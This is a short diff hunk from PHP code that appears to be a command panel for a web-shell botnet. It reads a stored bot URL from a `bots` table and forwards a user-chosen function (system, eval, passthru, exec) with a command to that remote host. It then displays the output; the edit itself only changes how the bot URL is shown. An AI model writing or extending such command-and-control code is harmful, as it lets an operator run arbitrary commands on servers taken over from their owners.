@@ -421,7 +421,7 @@ $check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = ".mysql_escape_st
 $row = mysql_fetch_array($check);
 if($row !== false && $_POST['func'] == 'system' || $_POST['func'] == 'eval' || $_POST['func'] == 'passthru' || $_POST['func'] == 'exec') {
 echo '</div></div><div class ="post"><h2 class="title"><a href="#">Results</a></h2><div class="entry">';
-echo '<p class="meta">'.$row[1].'?_='.htmlspecialchars($_POST['func']).'&__='.htmlspecialchars($_POST['cmd']).'</p>';
+echo '<p class="meta">'.$row[url].'?_='.htmlspecialchars($_POST['func']).'&__='.htmlspecialchars($_POST['cmd']).'</p>';
 $x = conn($row[1].'?_='.$_POST['func'].'&__='.urlencode($_POST['cmd']));
 $y = explode("{:|", $x);
 echo '<pre>'.htmlspecialchars($y[1]).'</pre>';
